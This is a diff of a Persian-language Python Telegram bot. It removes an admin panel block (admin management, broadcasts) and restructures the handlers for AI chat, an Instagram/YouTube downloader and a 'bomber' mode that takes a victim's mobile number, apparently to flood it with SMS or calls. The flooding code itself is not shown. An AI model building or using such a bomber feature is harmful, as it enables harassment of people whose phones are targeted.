     markup.row("📢 ارسال پیام سراسری")
     markup.row("بازگشت")
-
-    bot.send_message(
-        message.chat.id,
-        "🔐 پنل ادمین",
-        reply_markup=markup
-    )
-
-
-#==================admin_handler====================
-
-@bot.message_handler(func=lambda m: m.from_user.id in ADMINS and m.chat.id in user_sessions)
-def handle_admin_actions(message):
-    chat_id = message.chat.id
-    text = message.text.strip()
-
-    # برگشت به منوی اصلی
-    if text == "بازگشت":
-        user_sessions.pop(chat_id, None)
-        bot.send_message(chat_id, "🔙 برگشتی به منوی اصلی", reply_markup=main_menu(chat_id))
-        return
-
-    # فعال/غیرفعال بمبر
-    if text == "💣 فعال/غیرفعال بمبر 💣":
-        global BOMBER_ACTIVE
-        BOMBER_ACTIVE = not BOMBER_ACTIVE
-        state = "فعال شد ✅" if BOMBER_ACTIVE else "غیرفعال شد ❌"
-        bot.send_message(chat_id, f"💣 بمبر اکنون {state}")
-        return
-
-    # اضافه کردن ادمین
-    if text == "➕ اضافه کردن ادمین":
-        user_sessions[chat_id] = "adding_admin"
-        bot.send_message(chat_id, "آی‌دی کاربر جدید برای ادمین شدن را بفرستید:")
-        return
-
-    # حذف ادمین
-    if text == "➖ حذف ادمین":
-        user_sessions[chat_id] = "removing_admin"
-        bot.send_message(chat_id, "آی‌دی کاربر برای حذف از ادمین‌ها را بفرستید:")
-        return
-
-    # ارسال پیام سراسری
-    if text == "📢 ارسال پیام سراسری":
-        user_sessions[chat_id] = "broadcast_message"
-        bot.send_message(chat_id, "📢 متن پیام سراسری خود را وارد کنید:")
-        return
-
-    # اضافه کردن ادمین
-    if user_sessions.get(chat_id) == "adding_admin":
-        try:
-            new_id = int(text)
-            ADMINS.add(new_id)
-            # ذخیره در دیتابیس
-            conn = get_db_connection()
-            cur = conn.cursor()
-            cur.execute("INSERT INTO admins (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (new_id,))
-            conn.commit()
-            cur.close()
-            conn.close()
-
-            bot.send_message(chat_id, f"✅ آی‌دی {new_id} به ادمین‌ها اضافه شد")
-        except:
-            bot.send_message(chat_id, "❌ آی‌دی نامعتبر")
-        user_sessions[chat_id] = "admin_main"
-        return
-
-    # حذف ادمین
-    if user_sessions.get(chat_id) == "removing_admin":
-        try:
-            remove_id = int(text)
-            if remove_id in ADMINS:
-                ADMINS.remove(remove_id)
-                conn = get_db_connection()
-                cur = conn.cursor()
-                cur.execute("DELETE FROM admins WHERE user_id = %s", (remove_id,))
-                conn.commit()
-                cur.close()
-                conn.close()
-
-                bot.send_message(chat_id, f"✅ آی‌دی {remove_id} از ادمین‌ها حذف شد")
-            else:
-                bot.send_message(chat_id, "❌ این آی‌دی در لیست ادمین‌ها نیست")
-        except:
-            bot.send_message(chat_id, "❌ آی‌دی نامعتبر")
-        user_sessions[chat_id] = "admin_main"
-        return
-
-    # ارسال پیام سراسری
-    if user_sessions.get(chat_id) == "broadcast_message":
-        broadcast_text = text
-        conn = get_db_connection()
-        cur = conn.cursor()
-        cur.execute("SELECT user_id FROM users")
-        rows = cur.fetchall()
-        cur.close()
-        conn.close()
-
-        bot.send_message(chat_id, f"⏳ در حال ارسال پیام به {len(rows)} کاربر...")
-
-        for (user_id,) in rows:
-            try:
-                bot.send_message(user_id, f"📢 پیام ادمین:\n\n{broadcast_text}")
-            except Exception as e:
-                # کاربر ممکنه بلاک کرده باشه یا حذف شده باشه
-                pass
-
-        bot.send_message(chat_id, "✅ پیام سراسری ارسال شد")
-        save_bot_message(chat_id, f"ارسال پیام سراسری:\n{broadcast_text}")
-        user_sessions[chat_id] = "admin_main"
-        return
-
+    bot.send_message(message.chat.id, "🔐 پنل ادمین", reply_markup=markup)
 
 # ================== MESSAGE HANDLER ==================
 @bot.message_handler(func=lambda message: True)
@@ -1096,13 +342,17 @@ def handle_message(message):
     save_user(message)
     save_all_message(chat_id, text, chat_type="user")
 
+    # خروج از منو
     if text == "بازگشت":
         if chat_id in user_sessions:
             del user_sessions[chat_id]
         bot.send_message(chat_id, "🔙 برگشتی به منوی اصلی", reply_markup=main_menu(chat_id))
         return
 
-    if chat_id in user_sessions and user_sessions[chat_id] == "ai_chat":
+    user_type = user_sessions.get(chat_id, None)
+
+    # AI
+    if user_type == "ai_chat":
         bot.send_chat_action(chat_id, "typing")
         answer = ask_ai(text)
         save_ai_chat(chat_id, text, answer)
@@ -1110,12 +360,12 @@ def handle_message(message):
         save_bot_message(chat_id, answer)
         return
 
-    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
+    # BOMBER
+    if user_type == "waiting_phone":
         if not BOMBER_ACTIVE:
             bot.send_message(chat_id, "بمبر به دليل اتفاقات اخير و ضعيفي اينترنت متوقف شده است")
             del user_sessions[chat_id]
             return
-
         phone = text
         if not re.fullmatch(r"09\d{9}", phone):
             bot.send_message(chat_id, "❌ شماره اشتباهه\n📌 09xxxxxxxxx")
@@ -1135,7 +385,8 @@ def handle_message(message):
         del user_sessions[chat_id]
         return
 
-    if chat_id in user_sessions and user_sessions[chat_id] == "downloader":
+    # DOWNLOADER
+    if user_type == "downloader":
         if not ("instagram.com" in text or "youtu" in text):
             bot.send_message(chat_id, "❌ لینک معتبر نیست")
             return
@@ -1145,12 +396,11 @@ def handle_message(message):
             with open(file_path, "rb") as f:
                 bot.send_video(chat_id, f)
             os.remove(file_path)
-            del user_sessions[chat_id]  # ← پاک کردن session بعد از تمام شدن دانلود
+            del user_sessions[chat_id]
         except Exception as e:
             bot.edit_message_text(f"❌ خطا\n{str(e)}", chat_id, msg.message_id)
             save_bot_message(chat_id, "خطا در دانلود")
         return
-
 
 # ================== FLASK ==================
 @app.route('/')
@@ -1164,6 +414,7 @@ def health():
 def run_flask():
     app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
 
+# ================== RUN ==================
 if __name__ == "__main__":
     create_tables()
     import threading
